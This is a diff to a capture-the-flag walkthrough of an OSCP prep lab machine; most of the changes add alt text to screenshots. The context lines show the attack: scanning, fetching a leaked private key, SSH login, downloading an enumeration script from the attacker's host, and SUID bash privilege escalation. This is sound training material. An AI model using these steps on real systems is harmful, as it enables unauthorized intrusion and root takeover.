@@ -40,15 +40,15 @@ nmap -A -p- TARGET --min-rate 10000 -oN nmap.out
 | 80       | http        |
 | 33060    | mysql       |
 
-![](https://cdn.ziomsec.com/infosec_oscp_prep/1.webp)
+![performing an nmap scan on infosec oscp prep machine](https://cdn.ziomsec.com/infosec_oscp_prep/1.webp)
 
 ## Initial Foothold
 
 I visited the web application that was running on the target using my browser.
 
-![](https://cdn.ziomsec.com/infosec_oscp_prep/2.webp)
+![viewing the web app](https://cdn.ziomsec.com/infosec_oscp_prep/2.webp)
 
-![](https://cdn.ziomsec.com/infosec_oscp_prep/3.webp)
+![viewing the web app](https://cdn.ziomsec.com/infosec_oscp_prep/3.webp)
 
 The home page disclosed 2 things:
 - Username: *oscp*.
@@ -56,11 +56,11 @@ The home page disclosed 2 things:
 
 Upon closer inspection, when I clicked on the *SAMPLE PAGE* button on the top right corner, I got redirected to another page. I scrolled down and found a link to go to a login page.
 
-![](https://cdn.ziomsec.com/infosec_oscp_prep/4.webp)
+![viewing the web app](https://cdn.ziomsec.com/infosec_oscp_prep/4.webp)
 
 Upon clicking the *Log in* button, I got redirected to a wordpress login panel.
 
-![](https://cdn.ziomsec.com/infosec_oscp_prep/5.webp)
+![wordpress login panel](https://cdn.ziomsec.com/infosec_oscp_prep/5.webp)
 
 To find more hidden directories and files, I ran a scan using **dirb**.
 
@@ -68,17 +68,17 @@ To find more hidden directories and files, I ran a scan using **dirb**.
 dirb http://TARGET/ /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
 ```
 
-![](https://cdn.ziomsec.com/infosec_oscp_prep/6.webp)
+![running a dirb scan on the web app](https://cdn.ziomsec.com/infosec_oscp_prep/6.webp)
 
-![](https://cdn.ziomsec.com/infosec_oscp_prep/7.webp)
+![running a dirb scan on the web app](https://cdn.ziomsec.com/infosec_oscp_prep/7.webp)
 
 I visited the *robots.txt* page and found a link to a file called *secret.txt*
 
-![](https://cdn.ziomsec.com/infosec_oscp_prep/8.webp)
+![viewing robots.txt file](https://cdn.ziomsec.com/infosec_oscp_prep/8.webp)
 
 Upon visiting *secret.txt*, I get a base64 encoded block of text.
 
-![](https://cdn.ziomsec.com/infosec_oscp_prep/9.webp)
+![visiting secrets.txt endpoint](https://cdn.ziomsec.com/infosec_oscp_prep/9.webp)
 
 I decoded this file and downloaded it onto my system.
 
@@ -86,7 +86,7 @@ I decoded this file and downloaded it onto my system.
 curl http://TARGET/secret.txt | base64 -d > secret.txt
 ```
 
-![](https://cdn.ziomsec.com/infosec_oscp_prep/10.webp)
+![decoding the file](https://cdn.ziomsec.com/infosec_oscp_prep/10.webp)
 
 It turned out to be a private key. In order to **ssh** into the target using it, I had to find a valid username. Since the site was running on WordPress, I ran a scan using **wpscan** but didn't find anything besides the version and theme.
 
@@ -94,9 +94,9 @@ It turned out to be a private key. In order to **ssh** into the target using it,
 wpscan --url http://192.168.1.7
 ```
 
-![](https://cdn.ziomsec.com/infosec_oscp_prep/11.webp)
+![running wpscan](https://cdn.ziomsec.com/infosec_oscp_prep/11.webp)
 
-![](https://cdn.ziomsec.com/infosec_oscp_prep/12.webp)
+![running wpscan](https://cdn.ziomsec.com/infosec_oscp_prep/12.webp)
 
 I had earlier identified a username called *oscp* so, I tried using it along with the private key. To use the key for authentication, I modified its permissions so that only the owner has read and write access.
 
@@ -105,7 +105,7 @@ mv secret.txt private.key
 chmod 600 private.key
 ```
 
-![](https://cdn.ziomsec.com/infosec_oscp_prep/13.webp)
+![configuring private key](https://cdn.ziomsec.com/infosec_oscp_prep/13.webp)
 
 I then authenticated to the box using the key:
 
@@ -113,7 +113,7 @@ I then authenticated to the box using the key:
 ssh -i private.key oscp@TARGET
 ```
 
-![](https://cdn.ziomsec.com/infosec_oscp_prep/14.webp)
+![accessing the machine using private key](https://cdn.ziomsec.com/infosec_oscp_prep/14.webp)
 
 I got initial access to the system.
 
@@ -130,11 +130,11 @@ wget "http://KALI/lse.sh"
 chmod +x lse.sh
 ```
 
-![](https://cdn.ziomsec.com/infosec_oscp_prep/15.webp)
+![downloading linux smart enumeration script](https://cdn.ziomsec.com/infosec_oscp_prep/15.webp)
 
 It detected an **SUID** bit on the **bash** binary.
 
-![](https://cdn.ziomsec.com/infosec_oscp_prep/16.webp)
+![running linux smart enumeration script](https://cdn.ziomsec.com/infosec_oscp_prep/16.webp)
 
 I manually verified this by using the following command:
 
@@ -142,7 +142,7 @@ I manually verified this by using the following command:
 find / -user root -perm -u=s -ls 2>/dev/null
 ```
 
-![](https://cdn.ziomsec.com/infosec_oscp_prep/17.webp)
+![verifying suit bit](https://cdn.ziomsec.com/infosec_oscp_prep/17.webp)
 
 Now I can simply type **bash -p** to get root access.
 
@@ -152,7 +152,7 @@ The **bash -p** command starts a new instance of the Bash shell in "privileged" 
 
 With root access, I captured the flag from the *root* directory.
 
-![](https://cdn.ziomsec.com/infosec_oscp_prep/18.webp)
+![capturing the root flag](https://cdn.ziomsec.com/infosec_oscp_prep/18.webp)
 
 ## Closure
 
@@ -165,4 +165,4 @@ Here's a short summary of how I pwned the system:
 
 That's it from my side. Happy Hacking :)
 
-------------------------------------------------------------------------------------
+---
